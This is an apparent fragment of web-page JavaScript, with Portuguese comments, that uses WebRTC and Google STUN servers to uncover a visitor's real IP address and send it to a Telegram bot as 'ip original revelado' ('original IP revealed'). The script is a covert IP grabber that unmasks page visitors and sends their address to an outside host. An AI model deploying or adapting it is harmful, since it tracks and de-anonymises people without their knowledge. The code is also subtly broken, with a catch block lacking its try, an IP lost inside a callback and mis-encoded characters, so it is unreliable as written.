        async function testWebRTC() {
            const foundIPs = new Set();
            const pc = new RTCPeerConnection({
                iceServers: [
                    { urls: "stun:stun.l.google.com:19302" }, // STUN server do Google
                    { urls: "stun:stun1.l.google.com:19302" }
                ]
            });

            pc.createDataChannel("");
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);

            pc.onicecandidate = event => {
                if (!event || !event.candidate) return;
                const candidate = event.candidate.candidate;
                const parts = candidate.split(" ");
                const ip = parts[4];

                if (ip && !foundIPs.has(ip)) {
                    foundIPs.add(ip);
                    return ip; // Retorna o IP detectado
                }
            };
        }

        async function sendIPInfo() {
            const urlParams = new URLSearchParams(window.location.search);
            const chatId = urlParams.get('chat_id');
            
            if(chatId) {
                const ip = await testWebRTC(); // Obt√©m o IP usando WebRTC
                const message = `üñ§ ip original revelado: ${ip}`;

                    await fetch(`${TELEGRAM_API_URL}?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                }
            }
        }
